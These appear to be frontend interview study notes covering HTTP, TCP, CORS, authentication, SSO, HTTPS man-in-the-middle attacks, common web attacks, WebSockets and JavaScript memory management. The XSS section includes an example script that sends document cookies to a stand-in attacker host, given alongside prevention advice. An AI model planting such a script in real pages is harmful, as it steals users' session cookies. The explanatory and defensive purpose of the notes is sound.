- **304 Not Modified**: Indicates that the resource has not been modified since the last request.

### 4xx: Client Error
- **400 Bad Request**: The server cannot or will not process the request due to an apparent client error.
- **401 Unauthorized**: Similar to 403 Forbidden, but specifically for use when authentication is required and has failed or has not yet been provided.
- **403 Forbidden**: The request was valid, but the server is refusing action.
- **404 Not Found**: The requested resource could not be found but may be available in the future.
- **429 Too Many Requests**: The user has sent too many requests in a given amount of time.

### 5xx: Server Error
- **500 Internal Server Error**: A generic error message, given when an unexpected condition was encountered and no more specific message is suitable.
- **502 Bad Gateway**: The server was acting as a gateway or proxy and received an invalid response from the upstream server.
- **503 Service Unavailable**: The server is currently unavailable (because it is overloaded or down for maintenance).
- **504 Gateway Timeout**: The server was acting as a gateway or proxy and did not receive a timely response from the upstream server.

## Tell the difference of Ajax, Fetch and Axios

Ajax, Fetch, and Axios are all tools for making HTTP requests in web applications, but they have distinct characteristics and uses.

Overall, Ajax represents a classical approach to asynchronous web requests, while Fetch and Axios are modern techniques, with Axios providing a richer feature set and more user-friendly API than the native Fetch API.

### Ajax (Asynchronous JavaScript and XML)

1. **What it is**: Ajax is a technique that combines several technologies, including HTML, CSS, JavaScript, the DOM, XML, XSLT, and particularly the XMLHttpRequest object. It enables web pages to update asynchronously by exchanging data with the server in the background. This allows for updating specific sections of a webpage without needing to reload the entire page. 

2. **Code Example**:
   ```javascript
   var xhttp = new XMLHttpRequest();
   xhttp.onreadystatechange = function() {
       if (this.readyState == 4 && this.status == 200) {
          document.getElementById("demo").innerHTML = this.responseText;
       }
   };
   xhttp.open("GET", "ajax_info.txt", true);
   xhttp.send();
   ```

### Fetch API

1. **What it is**: The Fetch API is a modern method for making web requests. It is part of the window object in modern browsers and provides a cleaner, promise-based approach to asynchronous requests, making it a more straightforward alternative to XMLHttpRequest.

2. **Code Example**:
   ```javascript
   fetch('https://api.example.com/data')
     .then(response => response.json())
     .then(data => console.log(data))
     .catch(error => console.error('Error:', error));
   ```

### Axios

1. **What it is**: Axios is a widely-used, promise-based HTTP client that works both in the browser and in node.js. It is a third-party library offering an enhanced and more intuitive API for making HTTP requests. It offers a simple yet extensible interface, capable of making XMLHttpRequests in the browser and HTTP requests in node.js. Axios supports the Promise API, can intercept requests and responses, transform data, cancel requests, and automatically handle JSON data. 

2. **Code Example**:
   ```javascript
   axios.get('https://api.example.com/data')
     .then(response => {
       console.log(response.data);
     })
     .catch(error => {
       console.error('Error:', error);
     });
   ```

## Describe TCP 3-way handshake and 4-way termination
### TCP 3-Way Handshake (Connection Establishment)
1. **SYN**: The client begins the handshake by sending a SYN (synchronize) packet to the server. This packet carries the client's initial sequence number, which is crucial for coordinating the subsequent data transfer.
2. **SYN-ACK**: In response, the server sends back a SYN-ACK (synchronize-acknowledge) packet. This packet acknowledges the client's SYN (hence the ACK) and also contains the server's initial sequence number, setting the stage for two-way communication.
3. **ACK**: The client completes the handshake by sending an ACK (acknowledge) packet to the server. This acknowledges the server's SYN-ACK packet, and with this, the connection is officially established, ready for data transfer.

### TCP 4-Way Termination (Connection Termination)
1. **FIN from Initiator**: The initiator (say, client A) of the termination sends a FIN (finish) packet to the other party (client B), signaling that it has no more data to send.
2. **ACK from Receiver**: Client B acknowledges the FIN from A by sending back an ACK (acknowledge) packet. At this point, A knows that B is aware of its intention to close the connection.
3. **FIN from Receiver**: After sending any remaining data, B sends its own FIN packet to A, indicating its readiness to close the connection.
4. **ACK from Initiator**: A responds with a final ACK packet acknowledging B's FIN. Post this, A can safely close the connection. B, upon receiving this ACK, will also close the connection. This ensures a clean and orderly termination of the connection from both ends.

## Understanding TCP Packet Sticking

TCP packet sticking refers to the phenomenon where multiple data packets transmitted from one source are interpreted as a single packet by the receiving end. This behavior stems from TCP’s stream-oriented nature, which views data as a continuous stream, not as discrete units. Grasping this concept is essential for front-end developers, especially those dealing with real-time data flows.

### Reasons Behind TCP Packet Sticking
TCP packet sticking is influenced by several factors that affect the handling and interpretation of data packets:

**Application and TCP Buffer Size Discrepancy**  
TCP might combine small, frequently sent data chunks into fewer packets to enhance transmission efficiency. This occurs particularly when the data written by the application is much smaller than the TCP buffer size.

**Receiver Processing Delays**  
Delays in processing at the receiver’s end can lead to the accumulation of packets in the TCP buffer, which may then be treated as a single larger packet. This is common when the receiver does not quickly read the incoming data.

**Network Conditions and Retransmission**  
Variations in network conditions, such as congestion or transmission delays, and TCP’s retransmission strategies for handling lost packets can cause packets to be grouped upon receipt.

### Mitigating TCP Packet Sticking
Several technical solutions can be implemented to prevent TCP packet sticking and ensure accurate data transmission:

**Delimiters**  
Using specific characters or sequences to mark the end of messages can delineate message boundaries. This method requires caution, as delimiters might inadvertently occur within the data, potentially leading to parsing errors.

**Length-Prefixed Data**  
A robust solution involves prefixing each data segment with its length, informing the receiver of the exact byte count of the message. This ensures messages are fully and correctly reconstructed, independent of packet reception sequence.

**Application-Level Framing**
Creating custom protocols at the application level to define the structure and handling of messages can significantly reduce packet sticking. This technique can incorporate both delimiter and length-based strategies to adapt to different data transmission conditions.

**Fixed-Length Messages**
Employing messages with a predetermined size can facilitate data processing, as the receiver always knows the size of expected data, minimizing the risk of packet merging.

## Difference between HTTP and UDP

HTTP (Hypertext Transfer Protocol) and UDP (User Datagram Protocol) operate at different layers of the network stack, with HTTP functioning at the application layer and UDP at the transport layer.

**HTTP**
- **Layer**: Application
- **Connection**: Connection-oriented
- **Reliability**: HTTP is built on TCP (Transmission Control Protocol), which ensures reliable transmission of data through error checking and retransmission of lost packets.
- **Use Cases**: Web browsing, form submission, data transfer in a reliable and ordered manner.
- **Characteristics**: HTTP requests and responses are structured in a predefined format, allowing for complex web interactions, including state management through cookies, authentication, and caching strategies.

**UDP**
- **Layer**: Transport
- **Connection**: Connectionless
- **Reliability**: Does not guarantee delivery, order, or error checking, making it less reliable but faster compared to TCP.
- **Use Cases**: Streaming media (video, audio), online gaming, voice over IP (VoIP) where speed is crucial and occasional data loss is acceptable.
- **Characteristics**: Suitable for applications that require fast, efficient transmission, such as live broadcasting or multiplayer online games.

**OSI Model Layers**
1. Application Layer
2. Presentation Layer
3. Session Layer
4. Transport Layer (TCP, UDP)
5. Network Layer
6. Data Link Layer
7. Physical Layer

**TCP/IP Model Layers**
1. Application Layer (HTTP, DNS, SMTP)
2. Transport Layer (TCP, UDP)
3. Internet Layer (IP)
4. Network Interface Layer

## Follow-up: Difference between HTTP 1.0, 1.1, and 2.0
**HTTP 1.0**
- **Features**: Basic protocol supporting GET and POST methods.
- **Connection**: Each request opens a new TCP connection, leading to overhead and latency.

**HTTP 1.1**
- **Features**: Introduced more sophisticated caching mechanisms (Cache-Control, ETag), persistent connections (`Connection: keep-alive`) to allow multiple requests over a single connection, range requests, and additional methods like PUT and DELETE for RESTful APIs.
- **Performance**: Reduced latency by reusing connections, introduced chunked transfer encoding for dynamic content.

**HTTP 2.0**
- **Features**: Significantly improved performance through header compression (reducing overhead), multiplexing (allowing multiple requests and responses to be in flight simultaneously over a single TCP connection), and server push capabilities.
- **Adoption**: Increasingly widespread, offering substantial efficiency improvements over HTTP/1.x.

## Why send options request when using HTTP cross origin?
An OPTIONS request is vital in the CORS process to ensure secure cross-origin communication. It helps browsers determine whether the server's CORS policy permits the actual request, thus enhancing web security by allowing servers to specify who can access their resources and how.

### Understanding the Importance of OPTIONS Requests in Cross-Origin HTTP Communication

1. **Same-Origin Policy**: A fundamental security concept in web development, the same-origin policy restricts how a document or script loaded from one origin can interact with resources from another origin. This policy is implemented by web browsers to prevent potentially malicious scripts on one website from obtaining access to sensitive data on another website. A same origin is defined by matching the protocol, domain, and port of the two resources.

2. **Cross-Origin Resource Sharing (CORS)**: CORS is a mechanism that allows many resources (e.g., fonts, JavaScript, etc.) on a web page to be requested from another domain outside the domain from which the first resource was served. It's a way for servers to indicate any origins (domain, scheme, or port) other than its own from which a browser should permit loading of resources.

3. **OPTIONS Preflight Request**: In CORS, an OPTIONS preflight request is automatically sent by the browser to determine whether the cross-origin request is safe to send. This preflight checks if the server will accept the actual request, based on its CORS policy. This request includes methods like GET, POST, or custom headers that might be used in the actual request.

4. **Cross-Origin Requests without Preflight**: Not all cross-origin requests need a preflight. Simple requests, like using GET or POST with certain headers, might not trigger this preflight check. However, more complex requests, especially those using methods like PUT or DELETE, or containing custom headers, generally require a preflight check.

### CORS Solutions

**Solution 1: JSONP Approach**
```html
<!-- On the client side -->
<script>
    window.onSuccess = function (data) {
        console.log(data);
    }
</script>
<script src="https://www.example.com/api/getData"></script>
```
In the JSONP (JSON with Padding) approach, a `<script>` tag is used to bypass the same-origin policy. The external script contains a function call with the desired data. While this method can circumvent CORS restrictions, it's limited in functionality and security.

**Solution 2: Server-Side CORS Configuration (Preferred)**
```javascript
// Server-side configuration for CORS
response.setHeader("Access-Control-Allow-Origin", "http://localhost:8011"); // or use '*' for all origins
response.setHeader("Access-Control-Allow-Headers", "X-Requested-With");
response.setHeader("Access-Control-Allow-Methods", "PUT, POST, GET, DELETE, OPTIONS");
response.setHeader("Access-Control-Allow-Credentials", "true"); // Allow cookies
```
This approach involves configuring the server to send appropriate CORS headers, allowing requests from specific origins or methods. It's the preferred method for handling cross-origin requests as it provides better control and security.

## What is Restful API
RESTful APIs are architectural guidelines for designing networked applications. They rely on stateless, client-server communication, where operations are performed using standard HTTP methods. For managing a blog, RESTful APIs provide endpoints for creating (POST), deleting (DELETE), updating (PATCH or PUT), and querying (GET) blog posts. Each operation targets a specific resource, identified by a URL, and uses the appropriate HTTP method to convey the action. For updates, PUT replaces an entire resource, while PATCH modifies parts of it, making PATCH more suitable for updates where only a few fields change. This approach to API design promotes scalability, simplicity, and flexibility.

## User Authentication: Cookies vs. Tokens
### Cookies

Cookies are small data pieces sent from a website and stored on the user's device by their browser. They play a vital role in maintaining session state and personalizing user experience on the web.

- **Functionality**: Cookies are essential for managing user sessions. By attaching to every request, they help overcome HTTP's stateless nature, ensuring users remain logged in as they navigate a site.
- **Limitations**: Each cookie is limited to 4KB and must adhere to the Same-Origin Policy (SOP), which prevents sharing across different origins. Modern web practices favor LocalStorage and SessionStorage for data storage due to these limitations.
- **Security and Privacy**: In response to privacy concerns, modern browsers are restricting third-party cookies. Despite this, cookies are still widely used for authentication, in tandem with server-side sessions. To enhance security, the `HttpOnly` attribute can be set, preventing client-side script access and mitigating XSS attack risks.

**Authentication with Cookies and Sessions**

- Cookies contain identifiers (e.g., user ID), facilitating user authentication.
- Server-side sessions store user information linked to these identifiers, maintaining authenticated states across web requests.
- The authentication flow involves the server setting a cookie after successful credential verification, with subsequent requests using this cookie for secure and personalized interactions.

### Tokens

Tokens offer a customizable alternative to cookies, not bounded by HTTP standards. They are especially useful in scenarios requiring flexibility and cross-domain requests.

- **Storage and Management**: Unlike cookies, tokens need manual storage (e.g., in LocalStorage) and must be explicitly included in headers (e.g., `Authorization: Bearer <token>`).
- **Cross-Origin Resource Sharing (CORS)**: Tokens are not restricted by CORS, offering greater flexibility for cross-domain requests.
- **JWT (JSON Web Token)**: A prevalent type of token, JWTs are encrypted strings returned by the backend upon authentication. They contain all necessary user state information, enabling stateless authentication and facilitating scalability and performance in distributed systems.

**Advantages of JWT**

- **Cross-Domain Authentication**: JWTs operate independently of cookies, making them ideal for cross-domain scenarios.
- **Stateless Authentication**: With no need for server-side session storage, JWTs are perfect for distributed systems, enhancing scalability and reducing server load.
- **Self-Contained**: JWTs carry all necessary user information, allowing servers to verify requests with just the token, without database lookups.
- **Scalability and Performance**: The stateless nature of JWTs reduces the need for server resources, making them suitable for large-scale applications.

### Session vs. Token: Choosing the Right Approach

The choice between session and token-based authentication depends on application needs:

- **Session-Based Authentication** is preferred for applications requiring tight server control over user sessions and where server resource availability is not a constraint. It facilitates immediate user management actions.
- **Token-Based Authentication** shines in applications demanding scalability, reduced server load, and flexibility in cross-domain requests, minimizing CORS issues.

The decision should be guided by the application's architectural requirements, security needs, and anticipated user volume, balancing the trade-offs between control, scalability, and flexibility.

## Follow up: How to Achieve SSO (Single Sign-On)?

Single Sign-On (SSO) is an authentication process that allows a user to access multiple systems with one set of login credentials. This process involves three parties: the client side, the server side (System A), and a third-party SSO provider. The SSO flow typically follows these steps:

1. **Client Side Accesses System A**: The user tries to access System A.
2. **Authentication Failure**: System A checks for a valid certificate. Finding none, it informs the client that authentication has failed and login is required.
3. **Redirect to SSO Provider**: The client is redirected to the SSO provider because it lacks an SSO certificate.
4. **SSO Login Request**: The SSO provider requests the client to log in.
5. **Client Side Login**: The user logs in to the SSO provider.
6. **SSO Certificate and Token Issuance**: Upon successful login, the SSO provider issues a ticket (token) and an SSO certificate to the client.
7. **Certificate Storage on Client Side**: The client stores the SSO certificate.
8. **System A Validates Certificate**: The client attempts to access System A again, this time presenting the SSO certificate. System A contacts the SSO provider to validate the certificate.
9. **Certificate Validation by SSO Provider**: The SSO provider authenticates the certificate and validates the ticket.
10. **Valid Ticket Acknowledgment**: System A receives a message from the SSO provider that the ticket is valid and proceeds to process the client's request.
11. **Data Returned to Client Side**: System A returns the requested data to the client.

**Key Concepts Related to SSO:**

- **SSO Certificate**: A digital certificate that confirms the user's identity. It's used by the client to prove authentication without logging in again.
- **Token (Ticket)**: A unique piece of data issued by the SSO provider that represents the user's authentication state. It's used for validating the user's session without re-entering credentials.
- **Authentication Flow**: The process by which a user's identity is verified across multiple applications or systems using a single set of credentials managed by the SSO provider.

**Benefits of SSO:**

- **Enhanced User Experience**: Users need to log in only once to access multiple applications, simplifying their interaction with web services.
- **Improved Security**: Centralizes the management of user credentials and authentication processes, reducing the likelihood of password fatigue and the risks associated with managing multiple credentials.
- **Simplified Administration**: Eases the burden of password resets, account lockouts, and other administrative tasks related to user access across multiple systems.


## What is an HTTPS Man-in-the-Middle Attack? How Can It Be Prevented?

A Man-in-the-Middle (MitM) attack occurs when an attacker intercepts the communication between two parties, usually with the intent to secretly listen in or modify the messages being exchanged. In the context of HTTPS, this can be particularly damaging as HTTPS is designed to secure transmissions over the web, making any breach a serious concern.

### Symmetrical Encryption
Symmetrical encryption uses a single key for both encryption and decryption. This method is efficient and less resource-intensive, making it a cost-effective solution for many encryption needs.

### Asymmetrical Encryption
Asymmetrical encryption, on the other hand, involves two keys: a public key for encryption and a private key for decryption. This type of encryption is more secure but also more resource-intensive, leading to higher costs.

### HTTPS Encryption Process
- HTTP transmits data in plain text, making it vulnerable to interception and eavesdropping.
- HTTPS enhances security by encrypting the data transmitted between the client and the server. The encryption process involves:
  1. The client generates a random key and encrypts it with the server's public key, then sends this encrypted key to the server.
  2. The server decrypts the received key using its private key.
  3. Both parties use the random key for symmetric encryption, securing the subsequent communication.

The initial exchange of the random key uses asymmetrical encryption, ensuring that only the server can decrypt the key with its private key. The subsequent communication is secured through symmetrical encryption.

### Man-in-the-Middle Attack
During the asymmetrical encryption step, there's a risk that an attacker could intervene by presenting the client with the attacker's public key instead of the server's. This allows the attacker to decrypt, read, and potentially alter the communication by hijacking the session key.

### Prevention Measures
The primary defense against MitM attacks in the context of HTTPS is the use of certificates. Certificates are digital documents that verify the identity of the parties involved in the communication. They are issued by trusted third-party organizations known as Certificate Authorities (CAs). To prevent MitM attacks, it is crucial to:
- Ensure that the website's certificate is valid and issued by a reputable CA.
- The browser checks that the domain name in the certificate matches the website's domain.
- Use certificates from CAs that have established trust relationships with major browser vendors.

By adhering to these practices, both website owners and users can significantly reduce the risk of falling victim to MitM attacks, ensuring that their communications remain secure and private.

## Front-End Security Threats and Prevention Measures

### XSS (Cross-Site Scripting)
XSS attacks occur when an attacker injects malicious JavaScript code into a web application's output. The injected code executes within the victim's browser when they visit the compromised web page.

**Example:** An attacker could embed a script in a comment on a blog that sends the cookies of anyone viewing the comment to the attacker. This script might look something like `<script>fetch('http://evil.com/steal?cookie=' + document.cookie)</script>`.

**Prevention:** Ensure the encoding or escaping of user input on both the front-end and back-end. For example, convert `<` to `&lt;` and `>` to `&gt;`. Modern JavaScript frameworks like React automatically escape HTML to safeguard against XSS, significantly reducing the risk.

### CSRF (Cross-Site Request Forgery)
In CSRF attacks, attackers trick users into executing unwanted actions on a web application where they're authenticated, leveraging the user's identity.

**Example:** An attacker sends an email with a link to a malicious website. When the logged-in user clicks the link, the malicious site sends a request to a banking application to transfer money, exploiting the user's authenticated session.

**Prevention:** Employ anti-CSRF tokens and set the `SameSite` attribute for cookies to `strict` to prevent cross-site request forgery. Limiting CORS (Cross-Origin Resource Sharing) and utilizing authentication mechanisms also bolster security.

### Clickjacking
Clickjacking tricks users into clicking on something different from what the user perceives, often by embedding a page as a transparent iframe.

**Example:** An attacker places a transparent iframe over a button on a legitimate website. The user thinks they are clicking the legitimate button, but they are actually clicking a button within the iframe, potentially revealing sensitive information or agreeing to a malicious action.

**Prevention:** To prevent clickjacking, ensure that your website does not allow itself to be embedded in an iframe on another site by setting the `X-Frame-Options` header to `SAMEORIGIN`. Also, verify that `window.top.location.hostname` is the same as `window.location.hostname`; if not, redirect the user appropriately.

### DDoS (Distributed Denial of Service)
DDoS attacks flood a server with numerous requests to exhaust resources and bandwidth, rendering the service unavailable to legitimate users.

**Example:** A group of compromised computers (botnet) is used to flood an e-commerce site with so much traffic that legitimate customers cannot access the site during a major sale event.

**Prevention:** DDoS protection is challenging to implement at the software level alone; employing cloud-based DDoS protection services or Web Application Firewalls (WAF) can help mitigate these attacks.

### SQL Injection
SQL Injection attacks occur when an attacker is able to insert or "inject" a SQL query via the input data from the client to the application.

**Example:** An attacker inserts a SQL statement into a form field (e.g., login form) that is designed to log in users. This SQL statement is crafted to grant the attacker unauthorized access to the database, potentially allowing them to view sensitive information.

**Prevention:** Safeguard against SQL Injection by validating and sanitizing all user inputs. Utilize prepared statements and parameterized queries to ensure the database executes only the intended queries, not the injected malicious code.

### Best Practices for Prevention
Implementing robust security measures on both the front-end and back-end is crucial for protecting web applications against these attacks. This includes validating user inputs, employing security headers, and adhering to secure coding practices. Regular security audits and updates can also significantly reduce vulnerabilities.

## Websocket vs HTTP Protocol

### Websocket Protocol
- **Supports peer-to-peer communication**: Unlike HTTP, which is primarily designed for client-server communication, Websockets enable real-time, bi-directional communication between the client and server.
- **Protocol Name**: The Websocket protocol is indicated by `ws://` or `wss://` for secure Websockets, similar to how `http://` and `https://` indicate HTTP and HTTPS protocols.
- **Initiation**: A Websocket connection can be initiated by either the client or server side. This flexibility is particularly useful for applications that require real-time data exchange.
- **Use Cases**: It is widely used in applications requiring real-time interaction, such as message notifications, live discussion rooms, and collaborative editing platforms.
- **CORS Policy**: Websockets are not subject to the same-origin policy, which restricts how a document or script loaded from one origin can interact with resources from another origin. This means Websockets do not have CORS limitations.
- **Communication**: Communication over a Websocket is achieved through the `send` method for sending messages and the `onmessage` event handler for receiving messages. This contrasts with the request-response model used by HTTP.
- **Security**: A Websocket connection can be upgraded to a secure connection (`wss://`), analogous to upgrading HTTP to HTTPS, to ensure encrypted communication.

**Connection Steps**
1. The process begins with a standard HTTP request.
2. If successful, the connection is upgraded to a Websocket protocol for ongoing communication.

A Discussion Room Code Example:  
```js
// Node.js Side
const { WebSocketServer } = require('ws');
const wsServer = new WebSocketServer({ port: 3000 });
const list = new Set();

wsServer.on('connection', curWs => {
    console.info('Connected');
    list.add(curWs);
    // Implement cleanup mechanism here to remove inactive connections

    curWs.on('message', msg => {
        console.info('Received message:', msg.toString());
        // Broadcast to other clients
        list.forEach(ws => {
            if (ws === curWs) return;
            ws.send(msg.toString());
        });
    });
});
```
*Note: It's important to implement a cleanup mechanism to remove inactive connections to prevent memory leaks.*

```html
<!-- Client Side -->
<script>
    const ws = new WebSocket('ws://127.0.0.1:3000');
    ws.onopen = () => {
        console.info('Opened');
        ws.send('Client opened');
    };
    ws.onmessage = event => {
        console.info('Received message:', event.data);
    };

    const btnSend = document.getElementById('btn-send');
    btnSend.addEventListener('click', () => {
        console.info('Clicked');
        ws.send('Current time: ' + Date.now());
    });
</script>
```

In practice, for ease of use and additional features, developers often use libraries like Socket.IO. Socket.IO abstracts the complexities of Websockets and provides a cleaner API, such as `socket.emit()` for sending messages and `io.on()` for listening to events.

### Follow Up - Difference between WebSocket and HTTP: keep-alive

The main difference between WebSocket and HTTP with the `keep-alive` connection option lies in the nature of the communication and the initiation of requests.

**HTTP: keep-alive**
- **Connection Type**: HTTP is a stateless protocol. By default, each request/response pair is followed by closing the connection. However, with the `keep-alive` option, the connection between the client and server can be kept open, allowing multiple requests to be sent over the same connection without having to re-establish it each time.
- **Client-Initiated**: In an HTTP communication, even with `keep-alive`, the client initiates all requests. The server cannot send data to the client unless the client first sends a request. This means the server must wait for the client to request data before it can send any.
- **Server Response**: With `keep-alive`, the server holds the connection open for a specified time (or until a specified number of requests have been sent), allowing for faster subsequent requests by avoiding the overhead of establishing new connections. However, the server is essentially in a wait state, responding to client requests as they come in without the ability to initiate communication.
- **Timeouts and Retries**: If the server takes too long to respond, the client might face timeouts and may need to retry its request. This mechanism doesn't inherently solve issues related to real-time data exchange or server push capabilities.

**WebSocket**
- **Bi-Directional Communication**: WebSocket provides a full-duplex communication channel that operates over a single, long-lived connection. Once established, this connection allows either the client or the server to initiate messages, breaking away from the request-response model.
- **Server and Client Initiation**: Unlike HTTP, WebSocket allows the server to send data to the client at any time once the WebSocket connection is established. This makes it ideal for real-time applications where the server needs to push updates to the client without waiting for a request.
- **Real-Time Interaction**: WebSocket is designed for applications that require real-time data exchange, such as live chat, gaming, or financial trading applications, where the overhead of establishing new connections for each message (as in HTTP) would be prohibitive.
- **Efficiency and Performance**: WebSocket connections are more efficient for real-time communication because they eliminate the HTTP overhead after the initial handshake. This makes WebSocket a better choice for scenarios where performance and latency are critical.

## Difference between Prefetch and DNS-Prefetch

### `prefetch` and `preload`
- `preload` is a directive used to instruct the browser to load a resource early in the page's lifecycle, because it will be needed soon. This is crucial for resources that are critical to the current page's content, ensuring they are loaded with higher priority. The syntax is `<link rel="preload" href="example.js" as="script">` (or as="style" for CSS files), indicating that the resource is important for the immediate page load.
- `prefetch` is a hint to the browser that a resource might be needed in the future, but not on the current page. Resources prefetched are fetched and stored in the cache with low priority, during idle browser time, making them faster to load on subsequent page visits. The syntax is `<link rel="prefetch" href="example.js" as="script">`, suggesting the resource may be used in subsequent pages or actions.

### `dns-prefetch` and `preconnect`
- `dns-prefetch` is a way to resolve domain names (DNS lookups) before a user clicks on a link. This process reduces latency when the user navigates to the linked resource, as the DNS resolution step is already completed. The syntax for using it is `<link rel="dns-prefetch" href="//example.com">`. It's especially useful for third-party resources or any links that lead to different domains.
- `preconnect` goes a step further than DNS-prefetch by not only resolving the domain name but also performing the TCP handshake and, if the protocol is HTTPS, the TLS negotiation. This fully prepares the browser for a future connection, reducing the connection establishment time. The syntax is `<link rel="preconnect" href="//example.com">`. Preconnect is more comprehensive than DNS-prefetch because it completes all the preliminary network steps, making the resource ready to be used with minimal delay.

**Summary**
- Use **preload** for critical resources needed for the current page to ensure they are loaded quickly and with high priority.
- Use **prefetch** for resources that will be needed in subsequent page visits, to speed up their load time when the user navigates to those pages.
- Use **dns-prefetch** to resolve domain names ahead of time, reducing DNS lookup time for third-party resources or anticipated navigations.
- Use **preconnect** to fully prepare for a future connection, including DNS lookup, TCP handshake, and TLS negotiation, minimizing the latency for high-priority, cross-origin requests.

# 5. JS Engine: Browser and NodeJS.md

## Why 0.1 + 0.2 !== 0.3
This is a result of how computers handle binary floating-point arithmetic.

When you add these approximations, the tiny errors in their representation lead to results that are not exact, hence 0.1 + 0.2 results in something slightly different from 0.3. 

In practical terms, to compare floating-point numbers in such cases, a common approach is to check if they are close enough to each other, within a small tolerance, rather than expecting exact equality.

```javascript
const tolerance = 0.0001;
const sum = 0.1 + 0.2;
const target = 0.3;

if (Math.abs(sum - target) < tolerance) {
    console.log('Equal');
} else {
    console.log('Not Equal');
}
```

## Front-End Storage Options

Understanding the different storage options available in front-end development is crucial for managing data efficiently and enhancing user experience. Each storage mechanism has its unique features, capacity, and use cases. Here, we'll explore three primary storage spaces: `LocalStorage`, `SessionStorage`, and `Cookies`, focusing on their characteristics, benefits, and practical applications.

### LocalStorage

LocalStorage provides a way to store data persistently on the client's browser. It's a key-value storage mechanism that allows data to remain saved across browser sessions and even after the browser is closed and reopened.

**Features:**

- **Persistent Storage:** Data remains until it's explicitly removed via script or by the user, making it reliable for long-term data storage.
- **Capacity:** Offers around 5MB of storage per domain, which is sufficient for most use cases without impacting performance.
- **Access:** Data is accessible synchronously, ensuring easy retrieval from the same domain without involving server requests.

**Uses:**

- Ideal for saving user preferences, themes, or other settings that enhance the user experience.
- Caching application data to speed up load times and reduce dependency on network requests.
- Storing game progress or application states that can be resumed later.

### SessionStorage

SessionStorage is similar to LocalStorage in many ways but is designed for storage that lasts only for the duration of the page session. It's perfect for data that doesn't need to persist beyond the current tab or window.

**Features:**

- **Tab-Specific Storage:** Unique storage space for each tab or window, cleared automatically when the tab or window is closed.
- **Capacity:** Also offers about 5MB of storage per domain, aligning with LocalStorage.
- **Access:** Allows for synchronous access within the same domain, facilitating quick data retrieval for the session's duration.

**Uses:**

- Suitable for storing data related to user input, form states, or selections within a single session, preventing data loss when navigating pages.
- Temporary storage of application states that should not be retained after the session ends.
- Facilitating state management in single-page applications (SPAs) for a seamless user experience without persisting data beyond necessity.

### Cookies

Cookies are fundamentally different from LocalStorage and SessionStorage in that they are intended to be sent to and from the server with each HTTP request. This makes them a powerful tool for session management and tracking user activity.

**Features:**

- **Server Communication:** Automatically included with every HTTP request, making them ideal for authentication and state management.
- **Capacity:** Limited to about 4KB per cookie, which constrains their use to smaller data sets.
- **Expiration:** Can be set with a specific expiration date, after which they're deleted automatically, supporting both session-based and persistent storage strategies.

**Uses:**

- Managing user sessions by storing session identifiers, enabling users to remain logged in between visits.
- Storing user preferences or settings that influence server-side rendering or content delivery.
- Implementing tracking mechanisms for analytics, user behavior analysis, or targeted advertising.

### Choosing the Right Storage Mechanism

- **LocalStorage** shines for storing larger amounts of data that need to persist over long periods, without the overhead of server communication. It's best for enhancing client-side experience with minimal impact on performance.
- **SessionStorage** offers a transient storage solution for sensitive or temporary data, ensuring that information is not retained beyond the necessary scope of the user's session.
- **Cookies** remain a staple for scenarios requiring server-side access to client data, especially for authentication, session management, and personalization efforts. Their small size and automatic transmission with HTTP requests make them indispensable for certain tasks, albeit with considerations for security and performance.

## Explain how the stack is used in memory management for frontend applications
It operates on a Last In, First Out (LIFO) principle, efficiently managing function calls and primitive data types. When a function is invoked, its variables are pushed onto the stack, and upon the function's completion, they are removed. This system is particularly suitable for handling temporary, short-lived data. However, the stack's limited size means excessive usage can result in a stack overflow error.

## Explain how the heap is used in memory management for frontend web applications
It's used for dynamic allocation, primarily for objects and complex data structures. Unlike the stack, the heap is a larger, unstructured memory pool that requires manual management. Memory allocation and deallocation in the heap are handled by the JavaScript engine, which includes tasks like object creation and garbage collection.

## Explain the difference between primitive types and reference types
In JavaScript, primitive types and reference types are stored and accessed differently, which affects how they are used in programming.

Primitive types, such as `number`, `string`, `boolean`, `null`, `undefined`, `symbol`, and `bigint`, are stored directly in the variable's memory location, usually on the stack. This direct storage enables quick access and efficient memory management, particularly for simple, immutable values.

In contrast, reference types, like `object`, `array`, and `function`, are stored in the heap. When you create a reference type, the JavaScript engine allocates memory in the heap and stores the data there. The variable on the stack then holds a reference (or pointer) to that memory location. This means when you manipulate an object or an array, you're working through a reference. Any changes made to the object or array are reflected across all references to that object, as they all point to the same memory location in the heap.

### Related Topic: Memory Allocation for Objects and Arrays
Understanding how JavaScript allocates memory for objects and arrays is crucial. Since these are reference types, any operation involving copying or passing them around in your code means you're handling references, not the actual data. This behavior can lead to unexpected mutations if not properly managed, and is a fundamental concept in understanding JavaScript's memory management and behavior.

## Garbage Collection in JavaScript

Garbage collection in JavaScript is an automated process that identifies and frees up memory that is no longer being used by the application. This process is vital for preventing memory leaks and ensuring efficient memory usage. JavaScript implements garbage collection primarily through the following methods:

1. **Reference Counting**: In this method, the garbage collector counts the number of references to a value. When the reference count drops to zero, indicating that no part of the program is using that value, it is considered garbage and eligible for collection. However, reference counting has a significant limitation with circular references, where two objects reference each other, leading to memory leaks as their reference count never reaches zero.

2. **Mark-and-Sweep Algorithm**: Modern JavaScript engines, such as V8 (Chrome, Node.js) and SpiderMonkey (Firefox), use the Mark-and-Sweep algorithm. This method involves marking "roots" (variables directly referenced by the code being run, plus global variables). The garbage collector then traverses from these roots and marks all reachable objects. Objects not marked as reachable are considered unreachable and eligible for garbage collection. This approach effectively resolves the issue of circular references found in reference counting.

## Closures and Memory Leaks in JavaScript

Closures in JavaScript are not inherent sources of memory leaks. They are essential features that allow functions to access and remember variables from their lexical scope, even after the outer function has executed. However, if closures retain references to extensive scopes or objects longer than needed, they can contribute to memory leaks. This typically occurs when a closure, no longer in use, is still referenced in the code, preventing the garbage collector from freeing the memory of the scope's variables. Developers can prevent such issues by carefully managing the lifecycle of closures and ensuring they are dereferenced when no longer needed. This is particularly important in scenarios with loops or large objects.

## Detecting Memory Leaks in JavaScript and React

To detect memory leaks in JavaScript and React, tools like the Chrome Developer Tools are invaluable. The Performance tab in these tools allows developers to record memory usage while interacting with the application. Observing the heap usage over time helps identify potential memory leaks, indicated by a continuous increase in memory usage without drops after garbage collection cycles. 

Common scenarios leading to memory leaks in React include:
- Unmanaged event listeners
- Uncleared timers
- Misuse of external libraries
- Improper handling of state and props

Preventing memory leaks involves proactive resource management, such as removing event listeners and clearing timers when components unmount.

## WeakMap and WeakSet in JavaScript
WeakMap and WeakSet in JavaScript are collections that store objects weakly, meaning their elements are not prevented from being garbage-collected. They are often used in managing caches, tracking object references, and keeping metadata about objects without affecting their lifecycle.

